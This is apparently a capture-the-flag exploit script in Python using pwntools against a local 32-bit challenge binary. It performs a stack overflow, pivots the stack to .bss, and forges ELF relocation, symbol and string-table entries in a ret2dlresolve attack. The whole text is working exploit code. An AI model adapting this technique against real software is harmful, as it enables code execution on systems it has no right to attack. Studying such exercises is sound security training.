from pwn import *

context.log_level = 'debug'

p = process('./pwn')
elf = ELF('./pwn')

bss = elf.bss()
base_addr = bss + 0x800
leave_ret = 0x80490d5
start_resolve = 0x8049020
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
r_info = (((base_addr + 0x2c - dynsym) // 0x10) << 8) | 0x7
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
st_name = base_addr + 0x44 - dynstr

payload = b'a' * 0x108 + p32(base_addr - 4) + p32(elf.plt['read']) + p32(leave_ret) + p32(0) + p32(base_addr) + p32(0x200)
p.send(payload)

payload = p32(start_resolve) + p32(base_addr + 0x18 - rel_plt) + p32(0xdeadbeaf) + p32(0) + p32(bss + 0x200) + p32(0x200)
payload += p32(0x804C004) + p32(r_info) # fake Elf32_Rel结构体
payload += b'a' * 0xc # base_addr要0xc对齐以符合ida中结构
payload += p32(st_name) + p32(0) + p32(0) + p32(0x12) + p32(0) + p32(0)
payload += b'read\x00' # 伪造的dynstr字符串
p.send(payload)

p.interactive()